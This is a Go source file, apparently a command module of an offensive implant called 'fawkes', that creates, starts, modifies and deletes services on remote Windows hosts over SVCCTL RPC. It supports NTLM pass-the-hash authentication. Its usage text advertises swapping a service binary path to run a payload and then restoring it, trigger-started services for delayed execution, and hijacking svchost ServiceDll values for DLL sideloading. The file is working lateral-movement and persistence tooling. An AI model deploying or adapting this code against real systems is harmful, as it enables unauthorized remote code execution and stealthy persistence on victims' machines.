package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	svcctl "github.com/oiweiwei/go-msrpc/msrpc/scmr/svcctl/v2"
	"github.com/oiweiwei/go-msrpc/ssp"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

// SCM access rights
const (
	scManagerConnect          = 0x0001
	scManagerEnumerateService = 0x0004
	scManagerCreateService    = 0x0002
	scManagerAllAccess        = 0xF003F
)

// Service access rights
const (
	svcQueryConfig  = 0x0001
	svcChangeConfig = 0x0002
	svcQueryStatus  = 0x0004
	svcStart        = 0x0010
	svcStop         = 0x0020
	svcDelete       = 0x10000
	svcAllAccess    = 0xF01FF
)

// Service type constants
const (
	svcWin32OwnProcess   = 0x00000010
	svcWin32ShareProcess = 0x00000020
	svcWin32             = svcWin32OwnProcess | svcWin32ShareProcess
)

// Service start type
const (
	svcStartBoot     = 0x00000000
	svcStartSystem   = 0x00000001
	svcStartAuto     = 0x00000002
	svcStartDemand   = 0x00000003
	svcStartDisabled = 0x00000004
)

// Service state filter
const (
	svcStateActive   = 0x00000001
	svcStateInactive = 0x00000002
	svcStateAll      = 0x00000003
)

// Service control codes
const (
	svcControlStop  = 0x00000001
	svcControlPause = 0x00000002
)

// Service current state values
const (
	svcStateStopped         = 0x00000001
	svcStateStartPending    = 0x00000002
	svcStateStopPending     = 0x00000003
	svcStateRunning         = 0x00000004
	svcStateContinuePending = 0x00000005
	svcStatePausePending    = 0x00000006
	svcStatePaused          = 0x00000007
)

type RemoteServiceCommand struct{}

func (c *RemoteServiceCommand) Name() string { return "remote-service" }
func (c *RemoteServiceCommand) Description() string {
	return "Manage services on remote Windows hosts via SVCCTL RPC"
}

type remoteServiceArgs struct {
	Action      string `json:"action"`
	Server      string `json:"server"`
	Name        string `json:"name"`
	DisplayName string `json:"display_name"`
	BinPath     string `json:"binpath"`
	StartType   string `json:"start_type"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Hash        string `json:"hash"`
	Domain      string `json:"domain"`
	Timeout     int    `json:"timeout"`
}

// parsedService holds parsed enum results
type parsedService struct {
	serviceName  string
	displayName  string
	serviceType  uint32
	currentState uint32
}

func (c *RemoteServiceCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[remoteServiceArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	defer structs.ZeroString(&args.Password)
	defer structs.ZeroString(&args.Hash)

	if args.Action == "" || args.Server == "" {
		return successResult("Usage: remote-service -action <action> -server <host> [options]\n\n" +
			"Actions:\n" +
			"  list         — Enumerate all services\n" +
			"  query        — Query a specific service's config and status\n" +
			"  create       — Create a new service\n" +
			"  start        — Start a service\n" +
			"  stop         — Stop a service\n" +
			"  delete       — Delete a service\n" +
			"  modify-path  — Swap service binary path, start, then restore original\n" +
			"  trigger      — Create a trigger-started service (delayed execution)\n" +
			"  dll-sideload — Hijack svchost ServiceDll registry value\n\n" +
			"Options:\n" +
			"  -server       Target host (required)\n" +
			"  -name         Service name (required for most actions)\n" +
			"  -display_name Display name (for create/trigger)\n" +
			"  -binpath      Binary path or DLL path (required for create/modify-path/trigger/dll-sideload)\n" +
			"  -start_type   Start type: auto, demand, disabled (for create)\n" +
			"                Trigger type: network, domain-join, firewall, gpo (for trigger)\n" +
			"  -username     Username for authentication\n" +
			"  -password     Password for authentication\n" +
			"  -hash         NTLM hash for pass-the-hash (LM:NT or just NT)\n" +
			"  -domain       Domain for authentication\n" +
			"  -timeout      Timeout in seconds (default: 30)\n")
	}

	if args.Timeout <= 0 {
		args.Timeout = 30
	}

	action := strings.ToLower(args.Action)

	// Advanced operations that require both SVCCTL + WinReg remain in-process
	// (they'll need their own subprocess approach later if NTLM is required)
	switch action {
	case "modify-path", "modify_path":
		return remoteSvcModifyPath(args)
	case "trigger":
		return remoteSvcTrigger(args)
	case "dll-sideload", "dll_sideload":
		return remoteSvcDLLSideload(args)
	}

	if args.Password == "" && args.Hash == "" {
		return errorf("Either -password or -hash is required for remote service access")
	}

	opMap := map[string]string{
		"list":   "svcctl-list",
		"query":  "svcctl-query",
		"create": "svcctl-create",
		"start":  "svcctl-start",
		"stop":   "svcctl-stop",
		"delete": "svcctl-delete",
	}
	op, ok := opMap[action]
	if !ok {
		return errorf("Unknown action: %s\nAvailable: list, query, create, start, stop, delete, modify-path, trigger, dll-sideload", args.Action)
	}

	switch action {
	case "query", "start", "stop", "delete":
		if args.Name == "" {
			return errorf("Action %q requires -name parameter", action)
		}
	case "create":
		if args.Name == "" {
			return errorf("Action %q requires -name parameter", action)
		}
		if args.BinPath == "" {
			return errorf("Action %q requires -binpath parameter", action)
		}
	}

	params, err := json.Marshal(svcctlParams{
		Name:        args.Name,
		DisplayName: args.DisplayName,
		BinPath:     args.BinPath,
		StartType:   args.StartType,
	})
	if err != nil {
		return errorf("failed to marshal result: %v", err)
	}

	output, err := rpcViaSubprocess(rpcHelperRequest{
		Operation: op,
		Server:    args.Server,
		Username:  args.Username,
		Password:  args.Password,
		Hash:      args.Hash,
		Domain:    args.Domain,
		Timeout:   args.Timeout,
		Params:    params,
	})
	if err != nil {
		return errorf("remote service RPC call to %s failed: %v", args.Server, err)
	}

	var result svcctlResult
	if err := json.Unmarshal(output, &result); err != nil {
		return errorf("parsing result: %v", err)
	}
	return successResult(result.Text)
}

// remoteSvcConnect establishes a DCE-RPC connection to the remote SVCCTL service
// and opens the SCM. Returns the client, SCM handle, context, cancel func, and cleanup func.
func remoteSvcConnect(args remoteServiceArgs, desiredAccess uint32) (svcctl.SvcctlClient, *svcctl.Handle, context.Context, context.CancelFunc, func(), error) {
	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
	structs.ZeroString(&args.Password)
	structs.ZeroString(&args.Hash)
	if credErr != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("%v for remote service access", credErr)
	}

	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)

	cc, err := dcerpc.Dial(ctx, args.Server,
		dcerpc.WithEndpoint("ncacn_np:[svcctl]"),
		dcerpc.WithCredentials(cred),
		dcerpc.WithMechanism(ssp.SPNEGO),
		dcerpc.WithMechanism(ssp.NTLM),
	)
	if err != nil {
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("DCE-RPC connection failed: %w", err)
	}

	// Use WithInsecure() for DCE-RPC binding — SMB named pipes already provide
	// transport-level encryption. WithSeal()/WithSign() cause response decode
	// errors with go-msrpc SVCCTL due to a library bug.
	cli, err := svcctl.NewSvcctlClient(ctx, cc, dcerpc.WithInsecure())
	if err != nil {
		cc.Close(ctx)
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to create SVCCTL client: %w", err)
	}

	cleanup := func() {
		cc.Close(ctx)
	}

	scmResp, err := cli.OpenSCMW(ctx, &svcctl.OpenSCMWRequest{
		MachineName:   args.Server,
		DesiredAccess: desiredAccess,
	})
	if err != nil {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to open SCM: %w", err)
	}
	if scmResp.Return != 0 {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("OpenSCManagerW error: 0x%08x", scmResp.Return)
	}

	return cli, scmResp.SCM, ctx, cancel, cleanup, nil
}

